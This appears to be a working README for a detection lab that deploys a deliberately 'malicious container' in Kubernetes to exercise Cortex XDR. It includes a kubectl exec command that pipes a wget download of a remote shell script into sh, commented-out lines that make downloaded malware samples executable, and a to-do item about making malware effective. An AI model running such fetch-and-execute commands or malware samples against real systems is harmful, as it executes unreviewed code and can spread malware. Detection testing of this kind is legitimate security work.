# Cortex XDR Malicous Container

## Malicous Containers
[ ] How to make the malware executables effective 
[ ] Cleanup Script 
[ ] SA Shell execution for the different containers e.g malware container, Python crypto container 
[ ] Wildfire container enviorments 

## Working Tasks 

[X] test malicous contaienr script 
[X] Create dockerfile image 
[X] build container locally 
[X] test image locally 

## Dockerhub 


## Kubectl Quick Deployments 

microk8s kubectl run malicious-container --image=alpine --restart=Never -- /bin/sh -c "while true; do sleep 30; done"

microk8s kubectl exec -it malicious-container -- /bin/sh -c "wget https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh- qO-  | sh"

# Step 3: Make the Downloaded Samples Executable
#echo "[+] Making the downloaded samples executable..."
#chmod +x $DOWNLOAD_DIR/*_sample

# SENARIO --- LINUX MALWARE 